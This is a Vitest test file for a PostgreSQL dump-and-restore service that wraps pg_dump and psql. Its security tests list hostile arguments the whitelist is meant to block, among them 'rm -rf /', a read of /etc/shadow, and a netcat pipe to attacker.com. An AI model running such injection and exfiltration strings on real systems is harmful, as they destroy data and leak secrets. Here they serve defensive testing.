// SPDX-FileCopyrightText: 2026 TKMD and Reftrix Contributors
// SPDX-License-Identifier: AGPL-3.0-only

/**
 * DatabaseDumper サービス テスト
 *
 * テスト対象: DatabaseDumperService
 *
 * このテストは以下を検証します:
 * - DATABASE_URL パース（標準形式、特殊文字含む）
 * - pg_dump コマンド生成の正確性
 * - 成功時のSQL出力
 * - pg_dump未インストール時のエラー
 * - 接続エラーのハンドリング
 * - タイムアウトテスト
 * - restore() のSQL実行
 * - PGPASSWORD環境変数の適切な設定
 *
 * SEC-H2: DB接続文字列はモック環境内のテストフィクスチャデータ（spawnはvi.mock済み）。
 * 実際のDB接続は行われないため、ハードコードされた値はセキュリティリスクなし。
 */

import { describe, it, expect, beforeEach, afterEach, vi, type Mock } from 'vitest';
import { spawn, type ChildProcess } from 'child_process';
import { EventEmitter } from 'events';
import { Readable, Writable } from 'stream';

// 実際のモジュールをモック
vi.mock('child_process', () => ({
  spawn: vi.fn(),
  execSync: vi.fn(),
}));

// モジュールインポート（テスト対象）
import {
  DatabaseDumperService,
  DatabaseUrlParseError,
  PgDumpNotFoundError,
  DumpError,
  RestoreError,
  ConnectionError,
  TimeoutError,
  parseDatabaseUrl,
  type DatabaseConnectionInfo,
  type DumpOptions,
  type RestoreOptions,
} from '../../src/services/database-dumper.service';

/**
 * モック用の ChildProcess を作成
 */
function createMockProcess(options?: {
  stdout?: string;
  stderr?: string;
  exitCode?: number;
  shouldError?: boolean;
  errorMessage?: string;
  delay?: number;
}): ChildProcess {
  const mockProcess = new EventEmitter() as ChildProcess;

  // stdout/stderr/stdin のモック
  const stdoutEmitter = new Readable({ read() {} });
  const stderrEmitter = new Readable({ read() {} });
  const stdinMock = new Writable({
    write(chunk, encoding, callback) {
      callback();
    },
  });

  mockProcess.stdout = stdoutEmitter;
  mockProcess.stderr = stderrEmitter;
  mockProcess.stdin = stdinMock;
  mockProcess.pid = 12345;
  mockProcess.killed = false;
  mockProcess.kill = vi.fn().mockReturnValue(true);

  // 非同期でイベントを発火
  setTimeout(() => {
    if (options?.stdout) {
      stdoutEmitter.push(options.stdout);
      stdoutEmitter.push(null);
    } else {
      stdoutEmitter.push(null);
    }

    if (options?.stderr) {
      stderrEmitter.push(options.stderr);
    }
    stderrEmitter.push(null);

    if (options?.shouldError) {
      mockProcess.emit('error', new Error(options.errorMessage ?? 'Mock error'));
    } else {
      mockProcess.emit('close', options?.exitCode ?? 0);
    }
  }, options?.delay ?? 0);

  return mockProcess;
}

describe('DatabaseDumperService', () => {
  let service: DatabaseDumperService;
  let mockSpawn: Mock;

  beforeEach(() => {
    vi.clearAllMocks();
    mockSpawn = spawn as Mock;
    service = new DatabaseDumperService();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  // ==========================================================================
  // parseDatabaseUrl テスト
  // ==========================================================================

  describe('parseDatabaseUrl', () => {
    it('標準的なDATABASE_URLをパースできること', () => {
      // Arrange
      const url = 'postgresql://user:password@localhost:26432/reftrix';

      // Act
      const result = parseDatabaseUrl(url);

      // Assert
      expect(result).toEqual({
        host: 'localhost',
        port: 26432,
        database: 'reftrix',
        user: 'user',
        password: 'password',
      });
    });

    it('ポート指定なしの場合デフォルトポート5432を使用すること', () => {
      // Arrange
      const url = 'postgresql://user:password@localhost/reftrix';

      // Act
      const result = parseDatabaseUrl(url);

      // Assert
      expect(result.port).toBe(5432);
    });

    it('特殊文字を含むパスワードを正しくパースできること', () => {
      // Arrange
      // パスワード: p@ss%word!
      const url = 'postgresql://user:p%40ss%25word%21@localhost:5432/reftrix';

      // Act
      const result = parseDatabaseUrl(url);

      // Assert
      expect(result.password).toBe('p@ss%word!');
    });

    it('postgresプロトコルもサポートすること', () => {
      // Arrange
      const url = 'postgres://user:pass@host:5432/db';

      // Act
      const result = parseDatabaseUrl(url);

      // Assert
      expect(result.host).toBe('host');
      expect(result.database).toBe('db');
    });

    it('SSLパラメータを含むURLをパースできること', () => {
      // Arrange
      const url = 'postgresql://user:password@localhost:5432/reftrix?sslmode=require';

      // Act
      const result = parseDatabaseUrl(url);

      // Assert
      expect(result.database).toBe('reftrix');
      expect(result.sslmode).toBe('require');
    });

    it('無効なURLでエラーをスローすること', () => {
      // Arrange
      const invalidUrls = [
        '',
        'invalid-url',
        'http://localhost:5432/db',
        'postgresql://',
      ];

      // Act & Assert
      for (const url of invalidUrls) {
        expect(() => parseDatabaseUrl(url)).toThrow(DatabaseUrlParseError);
      }
    });

    it('ユーザー名がないURLでエラーをスローすること', () => {
      // Arrange
      const url = 'postgresql://localhost:5432/reftrix';

      // Act & Assert
      expect(() => parseDatabaseUrl(url)).toThrow(DatabaseUrlParseError);
    });
  });

  // ==========================================================================
  // dump() テスト
  // ==========================================================================

  describe('dump()', () => {
    const validDbUrl = 'postgresql://user:password@localhost:26432/reftrix';

    describe('正常系', () => {
      it('pg_dumpを正しく実行しSQLを返すこと', async () => {
        // Arrange
        const expectedSql = `
-- PostgreSQL database dump
CREATE TABLE users (id SERIAL PRIMARY KEY);
`;
        mockSpawn.mockReturnValue(createMockProcess({ stdout: expectedSql }));

        // Act
        const result = await service.dump(validDbUrl);

        // Assert
        expect(result).toBe(expectedSql);
        expect(mockSpawn).toHaveBeenCalledWith(
          'pg_dump',
          expect.arrayContaining([
            '--host=localhost',
            '--port=26432',
            '--username=user',
            '--dbname=reftrix',
            '--format=plain',
          ]),
          expect.objectContaining({
            env: expect.objectContaining({
              PGPASSWORD: 'password',
            }),
          })
        );
      });

      it('PGPASSWORDが環境変数で渡され実際のパスワード値がコマンドライン引数に含まれないこと', async () => {
        // Arrange
        // 実際のパスワード値 "secretPass123" を使用
        const urlWithRealPassword = 'postgresql://user:secretPass123@localhost:26432/reftrix';
        mockSpawn.mockReturnValue(createMockProcess({ stdout: '-- dump' }));

        // Act
        await service.dump(urlWithRealPassword);

        // Assert
        const spawnCall = mockSpawn.mock.calls[0];
        const args = spawnCall[1] as string[];
        const env = spawnCall[2]?.env as Record<string, string>;

        // 実際のパスワード値がコマンドライン引数に含まれていないこと
        // (--no-password は問題なし、セキュリティ上問題なのは実際のパスワード値)
        expect(args.join(' ')).not.toContain('secretPass123');
        // 環境変数に設定されていること
        expect(env.PGPASSWORD).toBe('secretPass123');
      });

      it('オプションでスキーマのみダンプできること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({ stdout: '-- schema only' }));
        const options: DumpOptions = { schemaOnly: true };

        // Act
        await service.dump(validDbUrl, options);

        // Assert
        const args = mockSpawn.mock.calls[0][1] as string[];
        expect(args).toContain('--schema-only');
      });

      it('オプションでデータのみダンプできること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({ stdout: '-- data only' }));
        const options: DumpOptions = { dataOnly: true };

        // Act
        await service.dump(validDbUrl, options);

        // Assert
        const args = mockSpawn.mock.calls[0][1] as string[];
        expect(args).toContain('--data-only');
      });

      it('特定テーブルのみダンプできること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({ stdout: '-- table dump' }));
        const options: DumpOptions = { tables: ['users', 'posts'] };

        // Act
        await service.dump(validDbUrl, options);

        // Assert
        const args = mockSpawn.mock.calls[0][1] as string[];
        expect(args).toContain('--table=users');
        expect(args).toContain('--table=posts');
      });

      it('ラージオブジェクト(LOB)をダンプできること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({ stdout: '-- with blobs' }));
        const options: DumpOptions = { includeLargeObjects: true };

        // Act
        await service.dump(validDbUrl, options);

        // Assert
        const args = mockSpawn.mock.calls[0][1] as string[];
        expect(args).toContain('--blobs');
      });

      it('許可されたadditionalArgsが引数に含まれること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({ stdout: '-- dump' }));
        const options: DumpOptions = {
          additionalArgs: ['--no-owner', '--no-acl', '--compress=9'],
        };

        // Act
        await service.dump(validDbUrl, options);

        // Assert
        const args = mockSpawn.mock.calls[0][1] as string[];
        expect(args).toContain('--no-owner');
        expect(args).toContain('--no-acl');
        expect(args).toContain('--compress=9');
      });
    });

    describe('セキュリティ: additionalArgsホワイトリスト検証', () => {
      it('許可されていない引数がフィルタリングされること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({ stdout: '-- dump' }));
        const options: DumpOptions = {
          additionalArgs: [
            '--no-owner',           // 許可
            '--file=/etc/passwd',   // 危険: 禁止
            '--no-acl',             // 許可
          ],
        };

        // Act
        await service.dump(validDbUrl, options);

        // Assert
        const args = mockSpawn.mock.calls[0][1] as string[];
        expect(args).toContain('--no-owner');
        expect(args).toContain('--no-acl');
        expect(args).not.toContain('--file=/etc/passwd');
      });

      it('コマンドインジェクション試行がブロックされること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({ stdout: '-- dump' }));
        const maliciousArgs: DumpOptions = {
          additionalArgs: [
            '--no-owner',
            '; rm -rf /',           // シェルインジェクション
            '$(whoami)',            // コマンド置換
            '| cat /etc/shadow',    // パイプインジェクション
            '--file=|nc attacker.com 1234',  // ファイル出力リダイレクト
          ],
        };

        // Act
        await service.dump(validDbUrl, maliciousArgs);

        // Assert
        const args = mockSpawn.mock.calls[0][1] as string[];
        expect(args).toContain('--no-owner');
        expect(args).not.toContain('; rm -rf /');
        expect(args).not.toContain('$(whoami)');
        expect(args).not.toContain('| cat /etc/shadow');
        expect(args).not.toContain('--file=|nc attacker.com 1234');
      });

      it('ホワイトリストに=付きで許可された引数が値付きでも通ること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({ stdout: '-- dump' }));
        const options: DumpOptions = {
          additionalArgs: [
            '--compress=9',        // --compress はホワイトリストにあり
            '--rows-per-insert=1000', // --rows-per-insert はホワイトリストにあり
          ],
        };

        // Act
        await service.dump(validDbUrl, options);

        // Assert
        const args = mockSpawn.mock.calls[0][1] as string[];
        expect(args).toContain('--compress=9');
        expect(args).toContain('--rows-per-insert=1000');
      });

      it('すべてのホワイトリスト引数が許可されること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({ stdout: '-- dump' }));
        const allAllowedArgs = [
          '--no-owner',
          '--no-acl',
          '--no-comments',
          '--no-publications',
          '--no-security-labels',
          '--no-subscriptions',
          '--no-tablespaces',
          '--no-privileges',
          '--inserts',
          '--column-inserts',
          '--clean',
          '--if-exists',
          '--create',
          '--verbose',
        ];

        const options: DumpOptions = { additionalArgs: allAllowedArgs };

        // Act
        await service.dump(validDbUrl, options);

        // Assert
        const args = mockSpawn.mock.calls[0][1] as string[];
        for (const allowedArg of allAllowedArgs) {
          expect(args).toContain(allowedArg);
        }
      });

      it('空のadditionalArgsでエラーが発生しないこと', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({ stdout: '-- dump' }));
        const options: DumpOptions = { additionalArgs: [] };

        // Act & Assert
        await expect(service.dump(validDbUrl, options)).resolves.toBe('-- dump');
      });

      it('undefinedのadditionalArgsでエラーが発生しないこと', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({ stdout: '-- dump' }));
        const options: DumpOptions = {};

        // Act & Assert
        await expect(service.dump(validDbUrl, options)).resolves.toBe('-- dump');
      });
    });

    describe('エラーハンドリング', () => {
      it('pg_dumpが見つからない場合PgDumpNotFoundErrorをスローすること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(
          createMockProcess({
            shouldError: true,
            errorMessage: 'spawn pg_dump ENOENT',
          })
        );

        // Act & Assert
        await expect(service.dump(validDbUrl)).rejects.toThrow(PgDumpNotFoundError);
      });

      it('接続エラー時にConnectionErrorをスローすること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(
          createMockProcess({
            exitCode: 1,
            stderr: 'connection to server at "localhost" failed: Connection refused',
          })
        );

        // Act & Assert
        await expect(service.dump(validDbUrl)).rejects.toThrow(ConnectionError);
      });

      it('タイムアウト時にTimeoutErrorをスローすること', async () => {
        // Arrange
        const neverResolveProcess = new EventEmitter() as ChildProcess;
        neverResolveProcess.stdout = new Readable({ read() {} });
        neverResolveProcess.stderr = new Readable({ read() {} });
        neverResolveProcess.stdin = new Writable({ write(c, e, cb) { cb(); } });
        neverResolveProcess.kill = vi.fn().mockReturnValue(true);
        neverResolveProcess.killed = false;

        mockSpawn.mockReturnValue(neverResolveProcess);

        // Act & Assert
        await expect(
          service.dump(validDbUrl, { timeoutMs: 100 })
        ).rejects.toThrow(TimeoutError);

        // プロセスがkillされていること
        expect(neverResolveProcess.kill).toHaveBeenCalled();
      });

      it('不正なexit codeでDumpErrorをスローすること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(
          createMockProcess({
            exitCode: 2,
            stderr: 'pg_dump: error: unknown option',
          })
        );

        // Act & Assert
        await expect(service.dump(validDbUrl)).rejects.toThrow(DumpError);
      });

      it('無効なDATABASE_URLでDatabaseUrlParseErrorをスローすること', async () => {
        // Arrange
        const invalidUrl = 'invalid-url';

        // Act & Assert
        await expect(service.dump(invalidUrl)).rejects.toThrow(DatabaseUrlParseError);
      });
    });
  });

  // ==========================================================================
  // restore() テスト
  // ==========================================================================

  describe('restore()', () => {
    const validDbUrl = 'postgresql://user:password@localhost:26432/reftrix';
    const sampleSql = `
BEGIN;
CREATE TABLE users (id SERIAL PRIMARY KEY, name VARCHAR(255));
INSERT INTO users (name) VALUES ('Alice');
COMMIT;
`;

    describe('正常系', () => {
      it('psqlを使ってSQLをリストアできること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({}));

        // Act
        await service.restore(validDbUrl, sampleSql);

        // Assert
        expect(mockSpawn).toHaveBeenCalledWith(
          'psql',
          expect.arrayContaining([
            '--host=localhost',
            '--port=26432',
            '--username=user',
            '--dbname=reftrix',
          ]),
          expect.objectContaining({
            env: expect.objectContaining({
              PGPASSWORD: 'password',
            }),
          })
        );
      });

      it('PGPASSWORDが環境変数で渡されること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(createMockProcess({}));

        // Act
        await service.restore(validDbUrl, sampleSql);

        // Assert
        const env = mockSpawn.mock.calls[0][2]?.env as Record<string, string>;
        expect(env.PGPASSWORD).toBe('password');
      });

      it('トランザクション内で実行されること（デフォルト）', async () => {
        // Arrange
        let writtenData = '';
        const mockProcess = createMockProcess({});
        const originalStdin = mockProcess.stdin;
        mockProcess.stdin = new Writable({
          write(chunk, encoding, callback) {
            writtenData += chunk.toString();
            callback();
          },
        });
        mockSpawn.mockReturnValue(mockProcess);

        // Act
        await service.restore(validDbUrl, sampleSql);

        // Assert
        expect(writtenData).toContain('BEGIN;');
        expect(writtenData).toContain('COMMIT;');
      });

      it('外部キー制約を一時無効化できること', async () => {
        // Arrange
        let writtenData = '';
        const mockProcess = createMockProcess({});
        mockProcess.stdin = new Writable({
          write(chunk, encoding, callback) {
            writtenData += chunk.toString();
            callback();
          },
        });
        mockSpawn.mockReturnValue(mockProcess);

        const options: RestoreOptions = { disableForeignKeys: true };

        // Act
        await service.restore(validDbUrl, sampleSql, options);

        // Assert
        expect(writtenData).toContain('SET session_replication_role = replica;');
        expect(writtenData).toContain('SET session_replication_role = DEFAULT;');
      });
    });

    describe('エラーハンドリング', () => {
      it('psqlが見つからない場合エラーをスローすること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(
          createMockProcess({
            shouldError: true,
            errorMessage: 'spawn psql ENOENT',
          })
        );

        // Act & Assert
        await expect(service.restore(validDbUrl, sampleSql)).rejects.toThrow(
          /psql.*not found/i
        );
      });

      it('SQL実行エラー時にRestoreErrorをスローすること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(
          createMockProcess({
            exitCode: 1,
            stderr: 'ERROR:  syntax error at or near "INVALID"',
          })
        );

        // Act & Assert
        await expect(service.restore(validDbUrl, sampleSql)).rejects.toThrow(RestoreError);
      });

      it('接続エラー時にConnectionErrorをスローすること', async () => {
        // Arrange
        mockSpawn.mockReturnValue(
          createMockProcess({
            exitCode: 2,
            stderr: 'psql: error: could not connect to server: Connection refused',
          })
        );

        // Act & Assert
        await expect(service.restore(validDbUrl, sampleSql)).rejects.toThrow(ConnectionError);
      });

      it('タイムアウト時にTimeoutErrorをスローすること', async () => {
        // Arrange
        const neverResolveProcess = new EventEmitter() as ChildProcess;
        neverResolveProcess.stdout = new Readable({ read() {} });
        neverResolveProcess.stderr = new Readable({ read() {} });
        neverResolveProcess.stdin = new Writable({ write(c, e, cb) { cb(); } });
        neverResolveProcess.kill = vi.fn().mockReturnValue(true);
        neverResolveProcess.killed = false;

        mockSpawn.mockReturnValue(neverResolveProcess);

        // Act & Assert
        await expect(
          service.restore(validDbUrl, sampleSql, { timeoutMs: 100 })
        ).rejects.toThrow(TimeoutError);
      });
    });
  });

  // ==========================================================================
  // isAvailable() テスト
  // ==========================================================================
  // Note: isAvailable() は execSync を直接使用しており、モックが困難なため
  // インテグレーションテストセクションに移動
  // ==========================================================================
});

// ==========================================================================
// インテグレーションテスト（CI環境でスキップ可能）
// ==========================================================================

describe('DatabaseDumperService Integration', () => {
  const shouldRunIntegration = process.env.RUN_INTEGRATION_TESTS === 'true';

  describe.skipIf(!shouldRunIntegration)('実際のpg_dump実行', () => {
    let service: DatabaseDumperService;

    beforeEach(() => {
      vi.restoreAllMocks();
      service = new DatabaseDumperService();
    });

    it('実際のpg_dumpコマンドが利用可能かチェック', async () => {
      // Act
      const result = await service.isAvailable();

      // Assert
      console.log('pg_dump available:', result.pgDump, result.pgDumpVersion);
      console.log('psql available:', result.psql, result.psqlVersion);

      // CIでは利用可能であることを期待
      if (process.env.CI) {
        expect(result.pgDump).toBe(true);
        expect(result.psql).toBe(true);
      }
    });

    it.skipIf(!process.env.DATABASE_URL)('実際のデータベースをダンプ', async () => {
      // Arrange
      const dbUrl = process.env.DATABASE_URL!;

      // Act
      const sql = await service.dump(dbUrl, { schemaOnly: true });

      // Assert
      expect(sql).toContain('PostgreSQL');
      expect(sql.length).toBeGreaterThan(0);
    });
  });
});
